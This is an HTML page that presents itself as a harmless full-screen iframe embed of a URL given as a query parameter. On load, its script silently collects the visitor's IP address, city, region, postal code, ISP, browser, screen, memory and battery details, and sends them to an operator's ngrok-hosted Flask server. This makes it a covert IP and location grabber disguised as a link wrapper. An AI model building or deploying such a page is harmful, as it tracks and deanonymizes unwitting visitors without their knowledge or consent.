<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Full‑screen Embed</title>
    <style>
        * { margin:0; padding:0; }
        html, body {
            width:100%;
            height:100%;
            overflow:hidden;
            background:#000;
        }
        iframe {
            display:block;
            width:100vw;
            height:100vh;
            border:none;
            transform:translateZ(0);
        }
    </style>
</head>
<body>
    <!-- The iframe src is set by JavaScript below -->
    <iframe id="embedFrame" allowfullscreen></iframe>

    <script>
        // ──────────────────────────────────────────────────────────
        // 1. Set iframe src from ?url=... parameter or fallback
        // ──────────────────────────────────────────────────────────
        const params = new URLSearchParams(window.location.search);
        const targetUrl = params.get('url') || 'https://example.com'; // default
        document.getElementById('embedFrame').src = targetUrl;

        // ──────────────────────────────────────────────────────────
        // 2. Auto‑send device report to your Flask backend
        //    (replace BASE_URL with your actual server URL)
        // ──────────────────────────────────────────────────────────
        (async function autoSend() {
            // 🔁 Change this to your Flask server's public URL (e.g., ngrok or your own domain)
            const BASE_URL = 'https://your-flask-server.ngrok.io'; 

            const data = {
                ip: 'Unknown',
                isp: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                postal: 'Unknown',
                browser: navigator.userAgent,
                mobile: /Mobi|Android|iPhone/i.test(navigator.userAgent),
                memory: navigator.deviceMemory || 'Unknown',
                screen: `${window.screen.width}x${window.screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                battery: 'Unknown',
                charging: 'Unknown'
            };

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = Math.round(battery.level * 100);
                    data.charging = battery.charging;
                } catch (_) {}
            }

            // Optional: enrich with IP/geo from ipapi.co
            try {
                const geoRes = await fetch('https://ipapi.co/json/');
                const geo = await geoRes.json();
                data.ip = geo.ip || data.ip;
                data.city = geo.city || data.city;
                data.region = geo.region || data.region;
                data.country = geo.country_name || data.country;
                data.isp = geo.org || data.isp;
                data.postal = geo.postal || data.postal;
            } catch (_) {}

            try {
                const response = await fetch(`${BASE_URL}/api/report`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                console.log('✅ Report sent:', result);
            } catch (error) {
                console.error('❌ Failed to send report:', error);
            }
        })();
    </script>
</body>
</html>
